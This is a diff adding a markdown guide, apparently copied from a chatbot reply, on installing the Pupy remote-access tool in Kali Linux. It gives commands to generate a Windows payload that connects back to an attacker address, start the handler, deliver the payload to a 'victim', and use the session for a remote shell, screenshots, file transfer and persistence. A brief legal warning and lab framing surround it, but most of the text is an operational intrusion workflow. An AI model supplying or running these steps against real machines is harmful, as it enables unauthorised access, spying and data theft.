@@ -1,0 +1,99 @@
+⚠️ LEGAL WARNING
+Using Pupy on systems you don’t own or have permission to test is illegal. Only use Pupy for ethical hacking, educational, or authorized penetration testing.
+
+🐍 How to Use Pupy in Kali Linux
+✅ Step-by-Step Guide:
+1. Install Dependencies
+Open terminal and run:
+
+bash
+Copy
+Edit
+sudo apt update && sudo apt install git python3-pip python3.10-venv build-essential python3-dev -y
+2. Clone Pupy Repository
+bash
+Copy
+Edit
+git clone https://github.com/n1nj4sec/pupy.git
+cd pupy
+3. Setup Python Virtual Environment (Recommended)
+bash
+Copy
+Edit
+python3 -m venv venv
+source venv/bin/activate
+pip install --upgrade pip setuptools
+4. Install Python Dependencies
+bash
+Copy
+Edit
+pip install -r requirements.txt
+If you face any errors, resolve them by installing missing system packages like:
+
+bash
+Copy
+Edit
+sudo apt install libssl-dev libffi-dev libxml2-dev libxslt1-dev zlib1g-dev
+5. Generate Payload
+Example: generate a Windows payload
+
+bash
+Copy
+Edit
+./pupygen.py -f exe_x86 connect --host 192.168.1.100 --transport tcp
+Options:
+
+-f exe_x86: Format (executable, shellcode, APK, etc.)
+
+--host: Your Kali IP address
+
+--transport: tcp/http/ssl/etc.
+
+6. Start Pupy Server (Handler)
+bash
+Copy
+Edit
+./pupysh.py
+Once started, it will listen for incoming connections from payloads.
+
+🎯 Example Attack Scenario (Lab Setup)
+Create a payload:
+
+bash
+Copy
+Edit
+./pupygen.py -f exe_x86 connect --host 192.168.1.100 --transport tcp
+Send this payload to the victim (in a test lab).
+
+When the payload runs, your pupysh server will get a session.
+
+📜 Useful Commands in pupysh Shell
+sessions: list active sessions.
+
+interact <session_id>: connect to a session.
+
+shell: get remote shell.
+
+screenshot: take a screenshot.
+
+download / upload: transfer files.
+
+persistence: enable persistence on reboot.
+
+🧪 Supported Payload Formats
+Windows: exe_x86, dll_x86, py, ps1
+
+Linux: py, elf_x86, elf_x64
+
+Android: apk
+
+MacOS: py, mach_o
+
+🧹 Clean Up
+To remove the environment:
+
+bash
+Copy
+Edit
+deactivate
+rm -rf pupy
